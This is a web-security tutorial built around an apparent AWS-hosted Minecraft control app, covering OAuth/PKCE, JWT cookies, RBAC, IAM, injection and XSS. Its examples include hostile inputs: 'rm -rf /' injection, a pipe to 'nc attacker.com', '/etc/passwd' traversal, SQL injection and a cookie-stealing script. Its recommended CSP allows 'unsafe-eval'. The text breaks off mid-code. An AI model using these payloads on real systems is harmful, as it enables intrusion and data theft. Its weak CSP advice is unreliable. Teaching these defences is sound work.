# Cybersecurity Fundamentals for Web Applications

A practical guide using the mc-aws project as a teaching example.

---

## Table of Contents

1. [Core Security Principles](#core-security-principles)
2. [Authentication & Sessions](#authentication--sessions)
3. [OAuth and Third-Party Sign-In](#oauth-and-third-party-sign-in)
4. [Authorization and Access Control](#authorization-and-access-control)
5. [Input Validation and Injection Attacks](#input-validation-and-injection-attacks)
6. [Communication Security (PKI, TLS)](#communication-security-pki-tls)
7. [Cloud Security Deep Dive: AWS IAM](#cloud-security-deep-dive-aws-iam)
8. [Network Isolation and Attack Surface](#network-isolation-and-attack-surface)
9. [Frontend Security](#frontend-security)
10. [Common Vulnerabilities](#common-vulnerabilities)
11. [Security Testing](#security-testing)
12. [Practical Remediation Guidance](#practical-remediation-guidance)

---

## Core Security Principles

Before diving into specifics, understand these fundamental concepts:

### Defense in Depth
Never rely on a single security control. Layer multiple protections so if one fails, others still protect you.

**Example in mc-aws:**
- User must be authenticated (cookie check)
- User must have appropriate role (admin vs allowed)
- Route validates session every request
- IAM permissions limit AWS actions even if app is compromised

### Least Privilege
Grant only the minimum permissions necessary to perform a task. If an account is compromised, damage is limited.

**Example:**
- EC2 instance role can only stop itself (via tag condition), not any instance
- Lambda can only use SSM on `/minecraft/*` parameters, not entire Parameter Store

### Zero Trust
Never trust any input or request, even from authenticated users. Validate everything on the server.

**Example:**
- Each API route calls `requireAdmin()` or `requireAllowed()`—middleware headers are ignored
- `instanceId` from request body is not blindly trusted; validation occurs

### Fail Securely (Fail Closed)
When something goes wrong, deny access rather than allow it.

**Example:**
- If SSM allowlist lookup fails, return empty list (deny) instead of skipping checks

---

## Authentication & Sessions

### Authentication vs Authorization

- **Authentication**: Proving who you are (logging in, showing ID)
- **Authorization**: Proving what you're allowed to do (role checks, permissions)

You must authenticate before you can authorize.

### Sessions in Stateless Applications

Traditional web apps used server-side sessions stored in memory or database. Modern apps often use **stateless** tokens that contain claims and are signed cryptographically.

#### JWT (JSON Web Token)

```
[header].[payload].[signature]
```

- **Header**: Describes the token type and signing algorithm
  ```json
  {"alg": "HS256", "typ": "JWT"}
  ```
- **Payload**: Claims (data about the user)
  ```json
  {"email": "user@example.com", "role": "admin", "iat": 1234567890, "exp": 1235167890}
  ```
  - `iat`: Issued at timestamp
  - `exp`: Expiration timestamp
- **Signature**: Cryptographic signature proving the token wasn't tampered with

**Why JWT?**
- Self-contained: Server doesn't need to store session state
- Verifiable: Anyone with the secret key can verify authenticity
- Stateless: Works well in distributed systems (multiple server instances)

**Security Considerations for JWT:**
1. **Never store secrets in payload** - JWT is base64-encoded, not encrypted. Anyone can read the payload.
2. **Use strong signing keys** - At least 32 random bytes for HS256
3. **Set reasonable expiration** - Balance UX and security (mc-aws uses 7 days)
4. **Validate all claims** - Don't trust the `role` claim; re-check against authoritative source

**Re-hydrating Roles (Good Pattern in mc-aws):**

```typescript
// lib/auth.ts

export async function verifySession(token: string): Promise<AuthUser | null> {
  try {
    const { payload } = await jwtVerify(token, SECRET);

    // Don't trust the role in the JWT—re-calculate from source of truth
    const allowlist = await getCachedAllowlist();
    const role = getUserRole(payload.email, allowlist);

    return { email: payload.email, role };
  } catch {
    return null; // Invalid or expired token
  }
}
```

**Why re-calculate?** If a user is removed from the allowlist, their old JWT with `role: "admin"` would still work if you trusted the token. By consulting the authoritative source (SSM Parameter Store), you ensure revocation works immediately.

#### HTTP-Only Cookies

Storing JWTs in `localStorage` is risky because JavaScript can read them (XSS vulnerability). Instead, use **httpOnly cookies**:

```typescript
cookies.set({
  name: "mc_session",
  value: token,
  httpOnly: true,    // JavaScript cannot read this cookie
  secure: true,     // Only sent over HTTPS
  sameSite: "lax",  // CSRF protection (explained below)
  path: "/",
  maxAge: 60 * 60 * 24 * 7, // 7 days
  // ⚠️ In development, secure: false allows HTTP
  secure: process.env.NODE_ENV === "production",
});
```

**Why httpOnly?** If an attacker injects malicious JavaScript (XSS), they can steal all accessible cookies. `httpOnly` cookies are protected from being read via JavaScript.

**Secure flag:** Ensures cookies are never sent over unencrypted HTTP, preventing network eavesdropping.

**SameSite attribute:** Controls when cookies are sent with cross-site requests.
- `"strict"`: Never send cookies with cross-site navigation (best security, worst UX)
- `"lax"`: Send cookies with top-level navigations (GET requests), but not for cross-site POST/XHR (good balance)
- `"none"`: Always send cookies (requires `secure: true`; used for embedded apps)

---

## OAuth and Third-Party Sign-In

### What OAuth Solves

OAuth allows your app to authenticate users using their accounts from providers like Google, GitHub, etc. It also enables your app to act on behalf of the user (access their Google Drive).

**Key Points:**
- OAuth is **authorization**, not authentication. It grants access to resources.
- OpenID Connect (OIDC) is built on OAuth and adds authentication (identity layer).

### OAuth 2.0 Authorization Code Flow with PKCE

This is the recommended flow for web applications. Here's how mc-aws implements Google OAuth:

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│   App    │──────────────────▶│  Google  │◀───────────────────│  User    │
│ (mc-aws) │                    │ OAuth 2.0│                    │ Browser  │
└──────────┘                    └──────────┘                    └──────────┘
```

#### Step-by-Step Flow

**1. User clicks "Sign in with Google"**

```typescript
// app/api/auth/login/route.ts

// Generate a cryptographic state value to prevent CSRF
const state = generateState();

// Generate a code verifier (random string) and its SHA-256 hash (code challenge)
const codeVerifier = generateRandomString(43);
const codeChallenge = await sha256(codeVerifier);

// Store these temporarily in httpOnly cookies (10-minute window)
cookies.set("oauth_state", state, { httpOnly: true, secure: true, maxAge: 600 });
cookies.set("oauth_code_verifier", codeVerifier, { httpOnly: true, secure: true, maxAge: 600 });

// Build authorization URL
const authUrl = new URL("https://accounts.google.com/o/oauth2/v2/auth");
authUrl.searchParams.set("client_id", GOOGLE_CLIENT_ID);
authUrl.searchParams.set("redirect_uri", `${APP_URL}/api/auth/callback`);
authUrl.searchParams.set("response_type", "code");
authUrl.searchParams.set("scope", "openid email profile");
authUrl.searchParams.set("code_challenge", codeChallenge);
authUrl.searchParams.set("code_challenge_method", "S256");
authUrl.searchParams.set("state", state);

// Redirect user to Google
return NextResponse.redirect(authUrl.toString());
```

**Security Elements:**
- **State**: Prevents Cross-Site Request Forgery (CSRF). When Google redirects back, it must include the same `state`. If it doesn't match, reject the request.
- **PKCE (Proof Key for Code Exchange)**: Prevents authorization code interception. Even if an attacker steals the short-lived authorization code, they can't exchange it without the `code_verifier`.

**2. User authorizes at Google**

Google shows consent screen, user approves. Google generates a temporary **authorization code** and redirects back:

```
GET /api/auth/callback?code=xyz123&state=abc456
```

**3. App receives callback and validates**

```typescript
// app/api/auth/callback/route.ts

export async function GET(request: NextRequest): Promise<NextResponse> {
  const { searchParams } = new URL(request.url);
  const code = searchParams.get("code");
  const state = searchParams.get("state");

  // 1. Retrieve state cookie
  const oauthState = cookies.get("oauth_state")?.value;

  // 2. Validate state (CSRF protection)
  if (!state || state !== oauthState) {
    // ❌ Reject: potential CSRF attack
    return NextResponse.redirect("/?error=oauth_state_mismatch");
  }

  // 3. Retrieve code verifier
  const codeVerifier = cookies.get("oauth_code_verifier")?.value;

  // 4. Exchange authorization code for tokens
  // This happens directly to Google (client-to-server)
  const tokenResponse = await fetch("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      client_id: GOOGLE_CLIENT_ID,
      client_secret: GOOGLE_CLIENT_SECRET,
      code,
      grant_type: "authorization_code",
      redirect_uri: `${APP_URL}/api/auth/callback`,
      code_verifier: codeVerifier, // ✅ PKCE verifier
    }),
  });

  const tokens = await tokenResponse.json(); // Contains access_token, id_token, refresh_token
```

**4. Get user identity and create session**

```typescript

  // 5. Use access_token to fetch user profile
  const userInfoResponse = await fetch("https://www.googleapis.com/oauth2/v2/userinfo", {
    headers: { Authorization: `Bearer ${tokens.access_token}` },
  });
  const userInfo = await userInfoResponse.json();
  const email = userInfo.email;

  // 6. Create JWT session
  const sessionToken = await createSession(email);

  // 7. Set httpOnly cookie
  cookies.set("mc_session", sessionToken, { httpOnly: true, secure: true, sameSite: "lax" });

  // 8. Clean up temporary OAuth cookies
  cookies.delete("oauth_state");
  cookies.delete("oauth_code_verifier");

  return NextResponse.redirect("/");
}
```

### Why PKCE is Essential Without Client Secrets

There are two types of OAuth clients:

1. **Confidential clients** (backend apps) - Can keep client secret secure
2. **Public clients** (mobile apps, SPAs) - Secrets can be extracted

mc-aws is a bit of a hybrid: it's a web app (server-side), but the client secret is server-side, and PKCE adds an extra layer of protection even though the secret exists.

**Threat model without PKCE:**
1. Attacker steals the authorization code (network interception, browser extension)
2. Attacker uses the code + client secret to get tokens
3. Attacker now has full access to the user's account

**With PKCE:**
1. Attacker steals authorization code
2. Without `code_verifier`, token exchange fails
3. The `code_verifier` was generated by the legitimate user's browser and never sent over the network until the final exchange

### CSRF Protection via State

**Attack Scenario:**
1. User is logged into Google in one tab
2. Attacker tricks user's browser into visiting `/api/auth/callback?state=attacker-controlled&code=stolen`
3. App processes the callback without checking state

**With state validation:**
1. App generates unique state when initiating OAuth
2. Stores it in httpOnly cookie
3. Validates returned state matches cookie value
4. Attacker's crafted callback fails because they don't know the state

---

## Authorization and Access Control

Once a user is authenticated, what can they do? Authorization determines this.

### Role-Based Access Control (RBAC)

Users are assigned roles, and roles have permissions. mc-aws uses three levels:

```typescript
// lib/auth.ts

export type UserRole = "admin" | "allowed" | "public";

export function getUserRole(email: string, allowedEmails: string[]): UserRole {
  // Hard-coded admin email (set via env var)
  if (email === env.ADMIN_EMAIL) {
    return "admin";
  }

  // Development-only (NEVER in production)
  if (email === "dev@localhost" && env.ENABLE_DEV_LOGIN === "true") {
    return "admin";
  }

  // Check allowlist (from SSM Parameter Store)
  if (allowedEmails.includes(email.toLowerCase())) {
    return "allowed";
  }

  return "public";
}
```

**Hierarchy of capabilities:**
- `admin`: Can start/stop/hibernate/backup/restore server, manage emails, view costs
- `allowed`: Can start server only
- `public`: Can view status only (no write operations)

### Per-Route Authorization Guards

```typescript
// lib/api-auth.ts

export async function requireAdmin(request: NextRequest): Promise<AuthUser> {
  const user = await getAuthUser(request);

  if (!user) {
    throw NextResponse.json(
      { success: false, error: "Authentication required" },
      { status: 401 }
    );
  }

  if (user.role !== "admin") {
    throw NextResponse.json(
      { success: false, error: "Insufficient permissions" },
      { status: 403 }
    );
  }

  return user;
}

// Usage in routes:

export async function POST(request: NextRequest) {
  try {
    const { email } = await requireAdmin(request); // Returns 401 or 403 if not admin
    // ... proceed
  } catch (response) {
    return response; // Return the error response
  }
}
```

**HTTP Status Codes:**
- `401 Unauthorized`: Not authenticated (no valid session)
- `403 Forbidden`: Authenticated but insufficient permissions

### Zero-Trust Verification

Don't trust `X-User-Role` or other headers set by middleware. Each route must verify:

```typescript
// ❌ BAD: Trusts middleware (bypassable)
export async function POST(request: NextRequest) {
  const role = request.headers.get("X-User-Role");
}

// ✅ GOOD: Verifies directly from session
export async function POST(request: NextRequest) {
  const user = await getAuthUser(request); // Reads cookie, verifies JWT, re-calculates role
  if (!user || user.role !== "admin") {
    return NextResponse.json({ error: "Forbidden" }, { status: 403 });
  }
}
```

---

## Input Validation and Injection Attacks

### The Problem: Trusting User Input

If your code takes user input and uses it unsafely, attackers can inject malicious commands.

**Example vulnerability:**
```bash
# User provides backup name: "; rm -rf / #"
# If used directly in shell:
tar -czf /tmp/backup.tar.gz /opt/minecraft/server; rm -rf / #
#                                                        ^^^^^^^^^^^
#                                                Also deletes everything!
```

### Shell Command Injection

Occurs when user input is concatenated into shell commands without proper escaping.

**Vulnerable code:**
```javascript
const output = await executeSSMCommand(instanceId, [
  `/usr/local/bin/mc-backup.sh ${userProvidedBackupName}` // ❌ UNSAFE
]);
```

**Exploited by:**
- Semicolon command chaining: `script.sh ; malicious-command`
- Pipes: `script.sh | nc attacker.com 1234`
- Command substitution: $( malicious-cmd ) or ` backticks `

### Defense: Whitelist Validation

**Sanitization pattern in mc-aws:**

```typescript
// lib/sanitization.ts

export function sanitizeBackupName(name: string): string {
  // Type and length checks
  if (!name || typeof name !== "string") {
    throw new Error("Backup name is required");
  }

  const trimmed = name.trim();

  if (trimmed.length > 64) {
    throw new Error("Backup name exceeds maximum length of 64 characters");
  }

  if (trimmed.length === 0) {
    throw new Error("Backup name cannot be empty");
  }

  // ✅ Whitelist: Only allow safe characters
  const safePattern = /^[a-zA-Z0-9._-]+$/;
  if (!safePattern.test(trimmed)) {
    throw new Error(
      "Backup name contains invalid characters. Only alphanumeric, dots, dashes, and underscores are allowed."
    );
  }

  return trimmed;
}
```

**Why whitelist, not blacklist?**
- Blacklists try to block known bad characters: `[;&|`$]`
- Attackers always find bypasses: newline `\n`, carriage return `\r`, URL encoding `%3B`, etc.
- Whitelists explicitly allow only known-good characters: `[a-zA-Z0-9._-]`
- Anything unexpected automatically rejected

**Safe usage:**
```javascript
const sanitized = sanitizeBackupName(userProvidedBackupName);
const output = await executeSSMCommand(instanceId, [
  `/usr/local/bin/mc-backup.sh "${sanitized}"` // ✅ Quoted + validated
]);
```

### SQL Injection (Conceptual)

Not applicable to mc-aws (uses AWS API, not SQL), but understand the pattern:

**Vulnerable:**
```sql
SELECT * FROM users WHERE email = '${userInput}'
-- If userInput is: admin' OR '1'='1
-- Becomes: SELECT * FROM users WHERE email = 'admin' OR '1'='1'
-- Returns ALL users!
```

**Safe (parameterized query):**
```sql
SELECT * FROM users WHERE email = $1  -- $1 treated as literal string, never code
```

**Key lesson:** Never construct queries/commands by string concatenation. Use parameterized APIs or string substitution with validated values.

### Path Traversal

Occurs when filenames from users are used unsafely to access files.

**Vulnerable:**
```javascript
const userData = fs.readFileSync(`/data/users/${userInput}`, 'utf-8');
// If userInput is "../../etc/passwd"
// Reads: /data/users/../../etc/passwd = /etc/passwd
```

**Defense:**
1. Validate and sanitize filenames (whitelist)
2. Use path resolution to check for escape attempts:
```javascript
const resolvedPath = path.resolve('/data/users', userInput);
if (!resolvedPath.startsWith('/data/users/')) {
  throw new Error('Attempted path traversal');
}
```

---

## Communication Security (PKI, TLS)

### TLS (Transport Layer Security)

Ensures all HTTP(S) traffic is encrypted:
- **Confidentiality**: Eavesdroppers can't read data
- **Integrity**: Man-in-the-middle can't modify data
- **Authentication**: You're talking to the real server

**How it works (public key cryptography):**
1. Server has a public/private key pair
2. Server presents certificate (binds public key to domain name)
3. Browser trusts certificate (signed by trusted Certificate Authority)
4. Session key established (symmetric encryption for actual data)

**Always require HTTPS in production:**
```typescript
// next.config.ts or middleware
if (process.env.NODE_ENV === 'production' && request.headers.get('x-forwarded-proto') !== 'https') {
  return NextResponse.redirect(`https://${request.headers.get('host')}${request.url}`, 301);
}
```

**Secure cookies require HTTPS:**
```typescript
cookies.set('session', token, { secure: true }); // Only sent over HTTPS
```

### HTTPS and Cookies

Never send sensitive cookies over HTTP:
- Attacker on same network can sniff cookies
- `secure: true` flag enforces HTTPS-only for cookie transmission

**Development exception:**
```typescript
cookies.set('session', token, {
  secure: process.env.NODE_ENV === 'production', // ✅ Allow HTTP in dev
});
```

### Certificate Pinning (Advanced)

For mobile apps or high-security scenarios, you can pin specific certificates. Not typically used for web apps (hard to update browsers).

---

## Cloud Security Deep Dive: AWS IAM

### IAM Fundamentals

AWS Identity and Access Management controls who can do what in your AWS account.

**Key concepts:**
- **Principals** (who): Users, roles, groups
- **Actions** (what): `ec2:StartInstances`, `ssm:SendCommand`, `ses:SendEmail`
- **Resources** (on what): Specific instance IDs, SSM parameter paths
- **Effects**: Allow or deny (DENY always overrides)

### IAM Policy Structure

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "ec2:StartInstances",
      "Resource": "arn:aws:ec2:us-east-1:123456789012:instance/i-1234567890abcdef0"
    }
  ]
}
```

### Least Privilege in Practice

**Overly permissive (bad):**
```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

**Scoped appropriately (good - from mc-aws):**
```json
{
  "Effect": "Allow",
  "Action": "ec2:StartInstances",
  "Resource": "arn:aws:ec2:*:*:instance/i-1234567890abcdef0"
}
```

### Resource-Based Policies

Some AWS resources have their own policies (S3 buckets, SNS topics, Lambda functions). These act as another access control layer.

**Example from mc-aws SES:**
Email receipts are routed to SNS, which triggers Lambda. The SNS subscription adds a policy to the topic granting the Lambda invocation permission.

### Condition-Based Access

You can restrict permissions based on request context:

```json
{
  "Effect": "Allow",
  "Action": "ec2:StopInstances",
  "Resource": "*",
  "Condition": {
    "StringEquals": {
      "ec2:ResourceTag/aws:cloudformation:stack-id": "arn:aws:cloudformation:us-east-1:123456789012:stack/MinecraftStack/*"
    }
  }
}
```

**Meaning:** Can't stop instances unless they're tagged as part of the MinecraftStack. Even if attacker gains Lambda access, they can only stop your instance, not other EC2 resources.

### KMS (Key Management Service) Encryption Context

mc-aws uses KMS to encrypt SSM parameters. Encryption contexts enforce context-specific decryption:

```json
{
  "Effect": "Allow",
  "Action": "kms:Decrypt",
  "Resource": "arn:aws:kms:*:*:key/*",
  "Condition": {
    "StringEquals": {
      "kms:EncryptionContext:PARAMETER_ARN": "arn:aws:ssm:*:*:parameter/minecraft/*"
    }
  }
}
```

**Meaning:** This key can only be used to decrypt parameters under `/minecraft/*`. If attacker attempts to decrypt other SSM parameters, even if they're encrypted with the same key, it fails.

### Service Roles

**EC2 Instance Role:**
- Assigned to the Minecraft server instance
- Allows the instance to communicate with AWS without hardcoded credentials
- Scoped to: SSM commands on itself, KMS decrypt for its parameters, EC2 stop on tagged resource

**Lambda Execution Role:**
- Assigned to the StartMinecraftServer Lambda
- Scoped to: EC2 start/stop on specific instance, SSM commands, SES email

**Never put credentials in code or environment variables**—use IAM roles for AWS resources.

---

## Network Isolation and Attack Surface

### Attack Surface Analysis

Every exposed port, endpoint, or service is a potential attack vector. Minimize exposure.

### EC2 Security Groups

AWS firewalls at the instance level:

```typescript
// infra/lib/minecraft-stack.ts

const securityGroup = new SecurityGroup(this, "MinecraftSecurityGroup", {
  vpc: Vpc.fromLookup(this, "VPC", { isDefault: true }),
  allowAllOutbound: true,
});

securityGroup.addIngressRule(peer: Peer.anyIpv4(), connection: Port.tcp(25565));
```

**What this does:**
- Allows inbound TCP/25565 (Minecraft) from any IPv4 address
- Allows all outbound traffic (instance can make external calls)
- **No SSH** (common mistake: 22 open for debugging)

**Assessment:**
- ✅ Minecraft port is necessary (that's the product)
- ✅ SSH is closed (reduces attack surface)
- ⚠️ `anyIpv4()` means anyone can attempt connections rate-limited only by application

**Hardening options:**
- Restrict to trusted IP ranges: `Peer.ipv4("203.0.113.0/24")`
- Use WAF (Web Application Firewall) if exposing HTTP endpoints
- Consider Cloudflare proxy or VPN management (mc-aws uses Cloudflare for DNS)

### VPC (Virtual Private Cloud) Isolation

mc-aws uses default VPC and **public subnets**. Better security would:

1. Use dedicated VPC with private subnets
2. Place EC2 instance in private subnet (no public IP)
3. Use NAT Gateway or VPC endpoints for outbound access
4. Access via:

   **Option A: Session Manager (SSM)**
   - No SSH needed, authorized via IAM
   - Audit logging built-in

   **Option B: VPN/Bastion**
   - VPN to private network, then SSH
   - Or single bastion host with hardened access

**Private subnets protect against:**
- Direct network scans of instance
- Compromised instance becoming pivot point
- Accidental exposure via misconfigured security groups

### IMDSv2 (Instance Metadata Service)

EC2 instances can query their own metadata (instance ID, IAM temporary credentials) via HTTP to 169.254.169.254.

**IMDSv2:**
- Requires session token (PUT request → GET request)
- Prevents SSRF (Server-Side Request Forgery) from accessing metadata

**mc-aws uses IMDSv2 implicitly** in idle checker script (`check-mc-idle.sh`).

**SSRF protection:**
If attacker can make the app server fetch arbitrary URLs (SSRF vulnerability), they might use it to fetch instance metadata and steal temporary credentials. IMDSv2 makes this harder.

---

## Frontend Security

### XSS (Cross-Site Scripting)

**Attack:** Attacker injects malicious JavaScript that runs in other users' browsers.

**Stored XSS:**
1. Attacker posts: `<script>steal(document.cookie)</script>`
2. Server stores in database
3. Other users view page, script executes

**Reflected XSS:**
1. Attacker sends link: `example.com/search?q=<script>steal()</script>`
2. Server reflects `q` in response unsafely
3. Victim clicks link, script executes

**DOM-based XSS:**
1. JavaScript writes unsanitized user input to DOM
2. Attacker-controlled data (like URL hash) becomes executable

### XSS Prevention in React

React auto-escapes content by default:

```jsx
// ✅ Safe: React escapes HTML
const message = "<script>alert('xss')</script>";
return <div>{message}</div>;  // Renders literal text, not script

// ❌ Dangerous: Only use if absolutely unavoidable
const dangerousHTML = "<script>alert('xss')</script>";
return <div dangerouslySetInnerHTML={{ __html: dangerousHTML }} />;
```

**mc-aws analysis:**
- ✅ No usage of `dangerouslySetInnerHTML` found
- ✅ All user-facing text rendered via React (auto-escaped)
- ✅ No dynamic script injection

### Origin Validation for postMessage

mc-aws uses popup window for OAuth/GDrive setup. Parent and child communicate via `window.postMessage`.

**Vulnerable implementation:**
```javascript
window.addEventListener('message', (event) => {
  if (event.data.type === 'AUTH_SUCCESS') {
    // ❌ Accepts messages from any origin
    handleSuccess();
  }
});
```

**Exploit:**
- Attacker opens your site in popup
- Sends `postMessage({type: 'AUTH_SUCCESS'}, '*')`
- Your site thinks OAuth succeeded

**Safe implementation (mc-aws):**
```typescript
// components/ControlsSection.tsx

const listener = (event: MessageEvent) => {
  if (event.origin !== window.location.origin) {
    return; // ❌ Reject messages from other origins
  }

  if (event.data.type === 'MC_AUTH_SUCCESS') {
    // ✅ Only accept from same origin
    refetchAuth();
    window.removeEventListener('message', listener);
  }

  if (event.data.type === 'GDRIVE_OAUTH_SUCCESS') {
    // ✅ Validate origin explicitly
    // ...
  }
};

window.addEventListener('message', listener);
```

**Key points:**
1. Always verify `event.origin` matches expected origin
2. Never use `event.source` or `window.opener` for trust
3. Consider also validating message structure (type field check)

### Content Security Policy (CSP)

HTTP header that restricts resources (scripts, styles, frames) the browser can load.

**Example CSP:**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-random123' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  frame-ancestors 'none';
  form-action 'self';
```

**What each directive does:**
- `default-src 'self'`: Only load resources from same origin
- `script-src`: Whitelists JavaScript sources
- `style-src 'unsafe-inline'`: Allows inline styles (necessary for some frameworks)
- `frame-ancestors 'none'`: Prevents clickjacking (can't be embedded in evil site's iframe)
- `form-action`: Restricts where forms can submit

**mc-aws status:**
- ❌ CSP not configured in `next.config.ts`
- Recommendation: Add CSP header via middleware or edge config

### Clickjacking Prevention

**Attack:** Attacker embeds your site in invisible iframe, tricks user into clicking buttons.

**Defense 1: X-Frame-Options header:**
```
X-Frame-Options: DENY  // Don't allow framing
X-Frame-Options: SAMEORIGIN  // Only allow framing from same origin
```

**Defense 2: CSP frame-ancestors:**
```
Content-Security-Policy: frame-ancestors 'none';
```

---

## Common Vulnerabilities

### Rate Limiting

**Problem:** Without rate limiting, attackers can:
- Brute-force passwords
- Exhaust resources (DoS)
- Abuse API endpoints

**mc-aws implementation:**

```typescript
// lib/rate-limit.ts

interface RateLimitEntry {
  count: number;
  windowStartMs: number;
}

const limiterStore = new Map<string, RateLimitEntry>();

export async function checkRateLimit(options: RateLimitOptions): Promise<RateLimitResult> {
  const { key, limit, windowMs } = options;
  const now = Date.now();

  let entry = limiterStore.get(key);

  if (!entry || now - entry.windowStartMs >= windowMs) {
    // New window
    entry = { count: 0, windowStartMs: now };
  }

  if (entry.count >= limit) {
    const retryAfter = Math.ceil((entry.windowStartMs + windowMs - now) / 1000);
    return { allowed: false, retryAfterSeconds: retryAfter };
  }

  entry.count++;
  limiterStore.set(key, entry);

  return { allowed: true, remaining: limit - entry.count, retryAfterSeconds: 0 };
}
```

**Usage:**
```typescript
// Only applied to OAuth endpoints in mc-aws
const clientIp = getClientIp(request.headers);
const result = await checkRateLimit({
  key: `auth:login:${clientIp}`,
  limit: 6,
  windowMs: 60_000, // 6 requests per minute
});

if (!result.allowed) {
  return NextResponse.redirect('/?error=oauth_rate_limited', {
    headers: { 'Retry-After': result.retryAfterSeconds.toString() },
  });
}
```

**Limitations:**
- ⚠️ In-memory only: Resets on server restart
- ⚠️ Not distributed: Doesn't share state across instances
- ⚠️ Only applied to: `/api/auth/login` and `/api/auth/callback`

**Recommendations:**
- Use Redis or DynamoDB for production rate limiting
- Apply to more endpoints (especially public-facing ones)

### Information Disclosure

**Problem:** Returning raw error messages leaks internal implementation details attackers can exploit.

**Example:**
```json
{
  "error": "GetParameterCommand: ParameterNotFound: /minecraft/gdrive-token does not exist"
}
```

**Attacker learns:**
- You use AWS SSM Parameter Store
- You store GDrive tokens
- Parameter naming convention

**Better approach:**
```json
{
  "error": "Google Drive not configured"
}
```

**mc-aws review:**
- ⚠️ Many routes return `error.message` directly
- ✅ Lambda notifications use sanitized error messages

### Mock Mode Security Risks

**Problem:** Testing mocks often bypass security checks for ease of use. If inadvertently enabled in production, creates backdoor.

**mc-aws example:**
```typescript
// app/api/gdrive/callback/route.ts

if (isMockMode() && mockQuery === "true") {
  // ❌ Bypasses state validation, token exchange, etc.
  const mockToken = { access_token: "mock-token", refresh_token: "mock-refresh" };
  await putParameter("/minecraft/gdrive-token", JSON.stringify(mockToken), "SecureString");
  return NextResponse.redirect("/?gdrive=success");
}
```

**Attack scenario:**
1. Attacker sets environment variable `MC_BACKEND_MODE=mock`
2. Attacker calls `GET /api/gdrive/callback?mock=true`
3. GDrive token overwritten with attacker-controlled value (if they can also call other endpoints)
4. Or simply bypass OAuth entirely

**Correct implementation (mc-aws):**
```typescript
if (isMockMode() && mockQuery === "true") {
  // ✅ Still requires admin authentication
  const admin = await requireAdmin(request);

  const mockToken = { access_token: "mock-token", refresh_token: "mock-refresh" };
  await putParameter("/minecraft/gdrive-token", JSON.stringify(mockToken), "SecureString");
  return NextResponse.redirect("/?gdrive=success");
}
```

**Remaining unauthenticated mock endpoints:**
- ❌ `POST /api/mock/reset` - Resets entire mock state
- ❌ `POST /api/mock/scenario` - Changes scenarios
- ❌ `POST /api/mock/fault` - Injects faults

**Recommendation:** Either:
1. Require authentication for mock endpoints
2. Add explicit check: `if (isMockMode() && process.env.ENABLE_MOCK_ENDPOINTS === 'true')`
3. Never deploy mock mode code to production (build-time exclusion)

### Dependency Vulnerabilities

**Problem:** Third-party libraries may contain security flaws.

**Mitigation:**
1. Regular audits: `pnpm audit`
2. Lock files commit exact versions
3. Dependabot / Renovate for automated updates

**mc-aws status:**
- ✅ Single low-severity advisory in transitive dependency
- ✅ No high/critical vulnerabilities

---

## Security Testing

### Dependency Scanning

```bash
pnpm audit
# or
pnpm audit --json  # Machine-readable output
```

**What it checks:**
- Known CVEs in dependencies
- Outdated vulnerable versions
- Severity ratings (low, moderate, high, critical)

### Unit Tests for Security

mc-aws has security-focused tests:

```typescript
// app/api/gdrive/callback/route.test.ts

it("should reject when state parameter does not match cookie", async () => {
  mocks.cookieStore.get.mockReturnValue({ value: "valid-state-from-cookie" });

  const req = createMockNextRequest("http://localhost/api/gdrive/callback?code=test_code&state=invalid-state");
  const res = await GET(req);

  expect(res.status).toBe(302);
  expect(res.headers.get("location")).toContain("?gdrive=error");
  expect(res.headers.get("location")).toContain("OAuth%20state%20mismatch");
});
```

**Tests security invariants:**
- State validation prevents CSRF
- Mock mode checks prevent bypass
- Authentication gates enforced
- Cookie cleanup after auth flows

### Integration Testing

- OAuth callback end-to-end with real Google
- Email delivery via SES with SPF/DKIM/DMARC
- IAM policy enforcement with real AWS calls

### Static Analysis

**Tools:**
- TypeScript compiler - catches type errors that could lead to vulnerabilities
- ESLint/Biome - code quality and security patterns
- SAST tools (Snyk, SonarQube) - automated vulnerability scanning

---

## Practical Remediation Guidance

### Priority 1: Critical Issues

**1. Add Security Headers (Next.js Middleware)**

Create `middleware.ts`:

```typescript
import { NextResponse } from 'next/server';

export function middleware(request: NextRequest) {
  const response = NextResponse.next();

  // Content Security Policy
  const csp = [
    "default-src 'self'",
    "script-src 'self' 'unsafe-eval' 'unsafe-inline'", // Adjust based on needs
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "font-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "block-all-mixed-content",
  ].join('; ');

  response.headers.set('Content-Security-Policy', csp);
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('X-Frame-Options', 'DENY');
  response.headers.set('X-XSS-Protection', '1; mode=block');
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  response.headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');

  return response;
}
```

**2. Sanitize Error Messages**

Create helper:

```typescript
// lib/error-handler.ts

export function sanitizeError(error: Error | string | unknown): string {
  if (error instanceof Error) {
    // Return safe message for known errors
    const safeMessages: Record<string, string> = {
      'ParameterNotFound': 'Requested configuration not found',
      'InvalidToken': 'Invalid authentication',
      'AccessDenied': 'Permission denied',
    };

    for (const [key, message] of Object.entries(safeMessages)) {
      if (error.message.includes(key)) {
        return message;
      }
    }

    // For unknown errors in production, return generic message
    if (process.env.NODE_ENV === 'production') {
      console.error('[API Error]', error.message, error.stack);
      return 'An error occurred. Please try again.';
    }

    // In development, show full error
    return error.message;
  }

  return String(error);
}

// Usage in routes:
// return NextResponse.json({ success: false, error: sanitizeError(error) }, { status: 500 });
```

**3. Secure Mock Endpoints**

```typescript
// app/api/mock/reset/route.ts

export async function POST(request: NextRequest) {
  // ✅ Enforce mock mode flag
  if (process.env.ENABLE_MOCK_ENDPOINTS !== 'true') {
    return NextResponse.json({ error: 'Not enabled' }, { status: 404 });
  }

  if (process.env.NODE_ENV === 'production') {
    return NextResponse.json({ error: 'Not available in production' }, { status: 403 });
  }

  // ✅ Require authentication even in mock mode (optional but recommended)
  // const user = await getAuthUser(request);
  // if (!user) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

